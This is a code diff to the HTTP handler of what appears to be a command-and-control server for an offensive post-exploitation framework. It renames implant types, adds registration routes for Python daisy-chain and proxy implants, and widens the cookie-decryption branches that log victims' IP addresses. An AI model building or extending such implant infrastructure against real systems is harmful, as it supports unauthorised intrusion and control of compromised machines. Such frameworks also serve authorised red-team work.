@@ -171,21 +171,26 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
         # register new implant
         elif new_implant_url in s.path and s.cookieHeader.startswith("SessionID"):
-          implant_type = "Normal"
+          implant_type = "PS"
           if s.path == ("%s?p" % new_implant_url):
-            implant_type = "Proxy"
+            implant_type = "PS Proxy"
           if s.path == ("%s?d" % new_implant_url):
-            implant_type = "Daisy"
+            implant_type = "PS Daisy"
           if s.path == ("%s?m" % new_implant_url):
-            implant_type = "OSX"
+            implant_type = "Python"
+          if s.path == ("%s?d?m" % new_implant_url):
+            implant_type = "Python Daisy"
+          if s.path == ("%s?p?m" % new_implant_url):
+            implant_type = "Python Proxy"
           if s.path == ("%s?c" % new_implant_url):
             implant_type = "C#"
-          if s.path == ("%s?p?c" % new_implant_url):
-            implant_type = "C#"
           if s.path == ("%s?d?c" % new_implant_url):
-            implant_type = "C#"
+            implant_type = "C# Daisy"
+          if s.path == ("%s?p?c" % new_implant_url):
+            implant_type = "C# Proxy"
+          
                                   
-          if implant_type == "C#":
+          if implant_type.startswith("C#"):
             cookieVal = (s.cookieHeader).replace("SessionID=","")
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
@@ -202,7 +207,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             s.end_headers()
             s.wfile.write(responseVal)
             
-          elif implant_type == "OSX":
+          elif implant_type.startswith("Python"):
             cookieVal = (s.cookieHeader).replace("SessionID=","")
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
